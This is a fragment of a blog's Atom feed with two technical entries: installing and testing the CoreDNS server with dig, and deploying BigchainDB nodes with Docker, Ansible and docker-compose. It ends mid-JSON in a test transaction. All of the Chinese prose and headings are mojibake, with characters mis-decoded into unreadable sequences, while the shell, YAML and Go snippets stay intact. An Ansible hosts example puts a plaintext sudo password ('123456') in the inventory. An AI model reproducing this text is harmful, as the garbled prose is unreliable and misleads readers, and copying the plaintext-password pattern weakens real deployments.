  </entry>
  
  <entry>
    <title>CoreDNSå®‰è£…ä½¿ç”¨</title>
    <link href="https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/"/>
    <id>https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/</id>
    <published>2023-01-01T04:15:37.000Z</published>
    <updated>2023-01-01T15:04:50.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="corednsç®€ä»‹"><a class="markdownIt-Anchor" href="#corednsç®€ä»‹"></a> CoreDNSç®€ä»‹</h2><ul><li>æ˜¯ä¸€ä¸ªDNSæœåŠ¡å™¨</li><li>æ”¯æŒæ’ä»¶</li><li>ä½¿ç”¨Goç¼–å†™çš„</li></ul><h2 id="å®‰è£…"><a class="markdownIt-Anchor" href="#å®‰è£…"></a> å®‰è£…</h2><ul><li>é¢„ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶<a href="https://github.com/coredns/coredns/releases/tag/v1.10.0">ä¸‹è½½åœ°å€</a></li><li>Docker <a href="https://hub.docker.com/r/coredns/coredns/">DockerHub-CoreDNS</a></li><li>æºä»£ç ç¼–è¯‘</li></ul><blockquote><p>å®‰è£…å¾ˆç®€å•ï¼Œä¸‹è½½è§£å‹å¯ä»¥å¾—åˆ°ä¸€ä¸ª<code>coredns</code>å¯æ‰§è¡Œæ–‡ä»¶</p></blockquote><h2 id="æµ‹è¯•"><a class="markdownIt-Anchor" href="#æµ‹è¯•"></a> æµ‹è¯•</h2><h3 id="å¯åŠ¨æœåŠ¡"><a class="markdownIt-Anchor" href="#å¯åŠ¨æœåŠ¡"></a> å¯åŠ¨æœåŠ¡</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./coredns -dns.port=1053</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•æœåŠ¡"><a class="markdownIt-Anchor" href="#æµ‹è¯•æœåŠ¡"></a> æµ‹è¯•æœåŠ¡</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @localhost -p 1053 a whoami.example.org</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥ä¸Šå‘½ä»¤å‡æœªæŠ¥é”™ï¼Œä¸”corednsæ‰“å°å‡ºäº†æœåŠ¡æ—¥å¿—</p></blockquote><h2 id="æ’ä»¶"><a class="markdownIt-Anchor" href="#æ’ä»¶"></a> æ’ä»¶</h2><p><a href="https://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/">å®˜æ–¹æ’ä»¶æ•™ç¨‹</a></p><p>å¯ä»¥é€šè¿‡å®ç°ä»¥ä¸‹goè¯­è¨€æ¥å£ï¼Œä½¿æ’ä»¶è·å–dnsæœåŠ¡å™¨çš„è¯·æ±‚ï¼Œè¿›è¡Œå¤„ç†å¹¶è¿”å›å¤„ç†ç»“æœ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(wh Whoami)</span></span> ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (<span class="type">int</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……çŸ¥è¯†"><a class="markdownIt-Anchor" href="#è¡¥å……çŸ¥è¯†"></a> è¡¥å……çŸ¥è¯†</h2><h3 id="digå‘½ä»¤"><a class="markdownIt-Anchor" href="#digå‘½ä»¤"></a> digå‘½ä»¤</h3><p>dig(domain information group)æ˜¯å¸¸ç”¨çš„åŸŸåæŸ¥è¯¢å·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥ä»æŒ‡å®šDNSæœåŠ¡å™¨æŸ¥è¯¢ä¸»æœºä¿¡æ¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.1-1ubuntu1.2-Ubuntu &lt;&lt;&gt;&gt; @localhost -p 1053 a whoami.example.org</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 32883</span></span><br><span class="line"><span class="string">;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3</span></span><br><span class="line"><span class="string">;; WARNING: recursion requested but not available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 1232</span></span><br><span class="line"><span class="string">; COOKIE: 83bd45262339483b (echoed)</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;whoami.example.org.            IN      A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ADDITIONAL SECTION:</span></span><br><span class="line"><span class="string">whoami.example.org.     0       IN      A       127.0.0.1</span></span><br><span class="line"><span class="string">_udp.whoami.example.org. 0      IN      SRV     0 0 41003 .</span></span><br></pre></td></tr></table></figure><ul><li>dig çš„æŸ¥è¯¢æ—¶é—´</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 127.0.0.1<span class="comment">#1053(localhost) (UDP)</span></span><br><span class="line">;; WHEN: Sun Jan 01 10:49:45 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 135</span><br></pre></td></tr></table></figure><h4 id="digçš„å‚æ•°"><a class="markdownIt-Anchor" href="#digçš„å‚æ•°"></a> digçš„å‚æ•°</h4><ul><li>æŒ‡å®šDNSæŸ¥è¯¢è®°å½•</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig www.baidu.com A     <span class="comment"># æŸ¥è¯¢Aè®°å½•ï¼Œå¦‚æœåŸŸååé¢ä¸åŠ ä»»ä½•å‚æ•°ï¼Œé»˜è®¤æŸ¥è¯¢Aè®°å½•</span></span><br><span class="line">dig www.baidu.com MX    <span class="comment"># æŸ¥è¯¢MXè®°å½•</span></span><br><span class="line">dig www.baidu.com CNAME <span class="comment"># æŸ¥è¯¢CNAMEè®°å½•</span></span><br><span class="line">dig www.baidu.com NS    <span class="comment"># æŸ¥è¯¢NSè®°å½•</span></span><br><span class="line">dig www.baidu.com ANY   <span class="comment"># æŸ¥è¯¢ä¸Šé¢æ‰€æœ‰çš„è®°å½•</span></span><br><span class="line"></span><br><span class="line">dig www.baidu.com A +short      <span class="comment"># æŸ¥è¯¢Aè®°å½•å¹¶æ˜¾ç¤ºç®€è¦çš„è¿”å›çš„ç»“æœ</span></span><br><span class="line">dig www.baidu.com A +multiline  <span class="comment"># æŸ¥è¯¢Aè®°å½•å¹¶æ˜¾ç¤ºè¯¦ç»†çš„è¿”å›ç»“æœ</span></span><br></pre></td></tr></table></figure><ul><li>æŒ‡å®šdnsæœåŠ¡å™¨</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @DNS_SERVER_IP -p port www.baidu.com</span><br></pre></td></tr></table></figure><ul><li>åªæ‰“å°answeréƒ¨åˆ†</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -p 1053 @localhost +noall +answer &lt;name&gt; &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_41982020/article/details/121231166">å…¶ä»–ä¿¡æ¯</a></p><h3 id="dnsè®°å½•ç±»å‹"><a class="markdownIt-Anchor" href="#dnsè®°å½•ç±»å‹"></a> DNSè®°å½•ç±»å‹</h3><p>DNSè®°å½•ç±»å‹åŒ…å«ï¼šAè®°å½•ã€AAAAè®°å½•ã€CNAMEè®°å½•ã€MXè®°å½•ã€NSè®°å½•ã€TXTè®°å½•ã€SRVè®°å½•ã€URLè½¬å‘ã€‚å¯¹è¿™äº›ç±»å‹çš„è®°å½•è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li><p>Aè®°å½•<br />å°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€ï¼ˆä¾‹å¦‚ï¼š100.100.100.100ï¼‰ï¼Œéœ€è¦å¢åŠ Aè®°å½•</p></li><li><p>AAAAè®°å½•<br />å°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv6åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰ï¼Œéœ€è¦æ·»åŠ AAAAè®°å½•</p></li><li><p>CNAMEè®°å½•<br />å°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®ç°ä¸è¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæœï¼Œéœ€è¦å¢åŠ CNAMEè®°å½•ã€‚è¿™ä¸ªåŸŸåä¸€èˆ¬æ˜¯ä¸»æœºæœåŠ¡å•†æä¾›çš„ä¸€ä¸ªåŸŸå</p></li><li><p>MXè®°å½•<br />å°†åŸŸåæŒ‡å‘ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œéœ€è¦è®¾ç½®MXè®°å½•ã€‚å»ºç«‹é‚®ç®±æ—¶ï¼Œä¸€èˆ¬ä¼šæ ¹æ®é‚®ç®±æœåŠ¡å•†æä¾›çš„MXè®°å½•å¡«å†™æ­¤è®°å½•</p></li><li><p>NSè®°å½•<br />è®°å½•æ˜¯åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šè¯¥åŸŸåç”±å“ªä¸ªDNSæœåŠ¡å™¨æ¥è¿›è¡Œè§£æã€‚</p></li><li><p>PTRè®°å½•<br />PTRè®°å½•æ˜¯Aè®°å½•çš„é€†å‘è®°å½•ï¼Œåˆç§°åšIPåæŸ¥è®°å½•æˆ–æŒ‡é’ˆè®°å½•ï¼Œè´Ÿè´£å°†IPåå‘è§£æä¸ºåŸŸå</p></li><li><p>SRVè®°å½•<br />Service Recordï¼Œç”¨äºæŒ‡å®šæœåŠ¡å™¨æä¾›æœåŠ¡çš„ä½ç½®ï¼ˆå¦‚ä¸»æœºåå’Œç«¯å£ï¼‰æ•°æ®</p></li></ul><h2 id="åœ¨windowsä¸‹è®¿é—®dnsæœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#åœ¨windowsä¸‹è®¿é—®dnsæœåŠ¡å™¨"></a> åœ¨windowsä¸‹è®¿é—®dnsæœåŠ¡å™¨</h2><p>åœ¨windowsä¸­ä½¿ç”¨digå‘½ä»¤è¿›è¡Œè¯•éªŒï¼Œå¦‚æœwindowså¯ä»¥æ­£å¸¸è¾“å‡ºï¼Œä¸”dnsæœåŠ¡å™¨å¯ä»¥æ‰“å°ç›¸åº”çš„æ—¥å¿—å³å¯</p><h3 id="bind9-çš„å®‰è£…"><a class="markdownIt-Anchor" href="#bind9-çš„å®‰è£…"></a> Bind9 çš„å®‰è£…</h3><p>digå‘½ä»¤å±äºbindå·¥å…·ï¼Œå®˜æ–¹æä¾›äº†<a href="ftp://ftp.isc.org/isc/bind9/9.9.9rc1/">ftp</a>æœåŠ¡å™¨ç”¨äºä¸‹è½½</p><h3 id="ä½¿ç”¨digå‘½ä»¤"><a class="markdownIt-Anchor" href="#ä½¿ç”¨digå‘½ä»¤"></a> ä½¿ç”¨digå‘½ä»¤</h3><p>æˆ‘ä½¿ç”¨çš„æ˜¯wslï¼Œé¦–å…ˆåœ¨wslä¸­ä½¿ç”¨ifconfigæ‰¾åˆ°wslçš„ipåœ°å€ï¼Œå¹¶ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œæµ‹è¯•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @172.23.208.1 -p 1053 www.baidu.com</span><br></pre></td></tr></table></figure><blockquote><p>è§‚å¯Ÿåˆ°å‘½ä»¤å¯ä»¥æ­£å¸¸è¿”å›ï¼ŒdnsæœåŠ¡å™¨ä¹Ÿæ‰“å°å‡ºäº†ç›¸åº”çš„æ—¥å¿—</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;corednsç®€ä»‹&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#corednsç®€ä»‹&quot;&gt;&lt;/a&gt; CoreDNSç®€ä»‹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;æ˜¯ä¸€ä¸ªDNSæœåŠ¡å™¨&lt;/li&gt;
&lt;li&gt;æ”¯æŒæ’ä»¶&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨Goç¼–å†™çš„&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;å®‰è£…&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å®‰è£…&quot;&gt;&lt;/a&gt; å®‰è£…&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;é¢„ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶&lt;a href=&quot;https://github.com/coredns/coredns/releases/tag/v1.10.0&quot;&gt;ä¸‹è½½åœ°å€&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Docker &lt;a href=&quot;https://hub.docker.com/r/coredns/coredns/&quot;&gt;DockerHub-CoreDNS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;æºä»£ç ç¼–è¯‘&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;å®‰è£…å¾ˆç®€å•ï¼Œä¸‹è½½è§£å‹å¯ä»¥å¾—åˆ°ä¸€ä¸ª&lt;code&gt;coredns&lt;/code&gt;å¯æ‰§è¡Œæ–‡ä»¶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;æµ‹è¯•&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#æµ‹è¯•&quot;&gt;&lt;/a&gt; æµ‹è¯•&lt;/h2&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="CoreDNS" scheme="https://jingtianer.github.io/home/tags/CoreDNS/"/>
    
  </entry>
  
  <entry>
    <title>BigChain DBçš„å®‰è£…ä¸ä½¿ç”¨</title>
    <link href="https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/"/>
    <id>https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/</id>
    <published>2022-12-05T04:15:37.000Z</published>
    <updated>2022-12-05T06:08:37.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="step1-æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹"><a href="#step1-æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹" class="headerlink" title="step1. æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹"></a>step1. æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹</h2><h3 id="ä½¿ç”¨All-in-One-Dockeræ­å»º"><a href="#ä½¿ç”¨All-in-One-Dockeræ­å»º" class="headerlink" title="ä½¿ç”¨All-in-One Dockeræ­å»º"></a>ä½¿ç”¨All-in-One Dockeræ­å»º</h3><ul><li>æ‹‰å–é•œåƒ</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure><ul><li>è¿è¡Œ<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --detach \</span><br><span class="line">  --name bigchaindb \</span><br><span class="line">  --publish 9984:9984 \</span><br><span class="line">  --publish 9985:9985 \</span><br><span class="line">  --publish 27017:27017 \</span><br><span class="line">  --publish 26657:26657 \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/db:/data/db \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/configdb:/data/configdb \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/tendermint:/tendermint \</span><br><span class="line">  bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure></li></ul><h3 id="ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º"><a href="#ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º" class="headerlink" title="ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º"></a>ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º</h3><h4 id="ä»€ä¹ˆæ˜¯Ansible-Playbooks"><a href="#ä»€ä¹ˆæ˜¯Ansible-Playbooks" class="headerlink" title="ä»€ä¹ˆæ˜¯Ansible Playbooks"></a>ä»€ä¹ˆæ˜¯Ansible Playbooks</h4><blockquote><p>Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the ansible-examples repository illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.</p></blockquote><ul><li>æ˜¯ä¸€ä¸ªä¸ºäº†ä¾¿äºå¤šæœºæ­å»ºçš„å·¥å…·</li></ul><h4 id="å®‰è£…Ansible-Playbooks"><a href="#å®‰è£…Ansible-Playbooks" class="headerlink" title="å®‰è£…Ansible Playbooks"></a>å®‰è£…Ansible Playbooks</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --user ansible</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨ansibleå®‰è£…BigChainDB"><a href="#ä½¿ç”¨ansibleå®‰è£…BigChainDB" class="headerlink" title="ä½¿ç”¨ansibleå®‰è£…BigChainDB"></a>ä½¿ç”¨ansibleå®‰è£…BigChainDB</h4><ul><li>é…ç½®hostsä¸­çš„allæ–‡ä»¶ï¼Œä½¿ç”¨basicconfig<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Basic configuration</span></span><br><span class="line"><span class="string">&lt;HOSTNAME&gt;</span>  <span class="string">ansible_ssh_user=tt</span> <span class="string">ansible_sudo_pass=123456</span> <span class="string">voting_power=&lt;INT&gt;</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /root/bigchaindb/bigchaindb-node-ansible:/home/bigchaindb-node-ansible -p 9983:9984  ubuntu /bin/bash</span><br><span class="line">ansible-playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨</span></span><br><span class="line">python3 -m ansible playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>å®˜ç½‘çš„è¿™ä¸ªå¯èƒ½ç”¨ä¸äº†ï¼Œä»–çš„åŸç†å¯èƒ½æ˜¯é€šè¿‡sshè¿æ¥è¿›è¡Œé…ç½®ï¼Œæˆ‘ä»¬éœ€è¦åç»­å»ºç«‹ä¸€ä¸ªssh</li><li>åç»­å¯ä»¥è‡ªå·±æ­å»ºansible Control Nodeè¾¾åˆ°å¤šæœºæ­å»ºçš„ä½œç”¨</li></ul><h3 id="ä¸ä½¿ç”¨docker"><a href="#ä¸ä½¿ç”¨docker" class="headerlink" title="ä¸ä½¿ç”¨docker"></a>ä¸ä½¿ç”¨docker</h3><ul><li><a href="http://docs.bigchaindb.com/en/latest/installation/node-setup/set-up-node-software.html">å®˜æ–¹æ•™ç¨‹</a></li></ul><blockquote><p>ä»¥ä¸Šä¸‰ç§æ–¹æ³•ä»»é€‰å…¶ä¸€å°±å¯ä»¥ï¼Œç¬¬ä¸‰ç§æ–¹æ³•å¦‚æœéœ€è¦ä¸€ä¸ªæœºå™¨å¯¹åº”ä¸€ä¸ªèŠ‚ç‚¹æ—¶å†è€ƒè™‘ã€‚</p></blockquote><h2 id="step2-å»ºç«‹ç½‘ç»œ"><a href="#step2-å»ºç«‹ç½‘ç»œ" class="headerlink" title="step2. å»ºç«‹ç½‘ç»œ"></a>step2. å»ºç«‹ç½‘ç»œ</h2><h3 id="ç¼–å†™docker-composeæ–‡ä»¶"><a href="#ç¼–å†™docker-composeæ–‡ä»¶" class="headerlink" title="ç¼–å†™docker composeæ–‡ä»¶"></a>ç¼–å†™docker composeæ–‡ä»¶</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mongodb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:3.6</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;27017:27017&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">mongod</span></span><br><span class="line">  <span class="attr">bigchaindb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">bigchaindb/bigchaindb</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">tendermint</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_BACKEND:</span> <span class="string">localmongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_HOST:</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_PORT:</span> <span class="number">27017</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_SERVER_BIND:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:9984</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_HOST:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_ADVERTISED_HOST:</span> <span class="string">bigchaindb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_HOST:</span> <span class="string">tendermint</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_PORT:</span> <span class="number">26657</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9984:9984&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9985:9985&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26658:26658&quot;</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://bigchaindb:9984 &amp;&amp; curl http://tendermint:26657/abci_query&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">3s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">5s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">    <span class="comment">#command: &#x27;bigchaindb start&#x27;</span></span><br><span class="line">  <span class="attr">tendermint:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tendermint/tendermint:0.22.8</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tmdata:/tendermint</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26656:26656&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26657:26657&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&quot;tendermint init &amp;&amp; tendermint node --consensus.create_empty_blocks=false --proxy_app=tcp://bigchaindb:26658&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨tendermintç”Ÿæˆé…ç½®æ–‡ä»¶"><a href="#ä½¿ç”¨tendermintç”Ÿæˆé…ç½®æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨tendermintç”Ÿæˆé…ç½®æ–‡ä»¶"></a>ä½¿ç”¨tendermintç”Ÿæˆé…ç½®æ–‡ä»¶</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tendermint testnet</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹ç”Ÿæˆçš„é…ç½®æ–‡ä»¶ï¼Œå†™å…¥èŠ‚ç‚¹å®é™…ip</li></ul><h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="step3-æµ‹è¯•"><a href="#step3-æµ‹è¯•" class="headerlink" title="step3. æµ‹è¯•"></a>step3. æµ‹è¯•</h2><ul><li><p>ä½¿ç”¨postmanå‘é€æµ‹è¯•Postäº¤æ˜“</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;asset&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello BigchainDB!&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4957744b3ac54434b8270f2c854cc1040228c82ea4e72d66d2887a4d3e30b317&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span 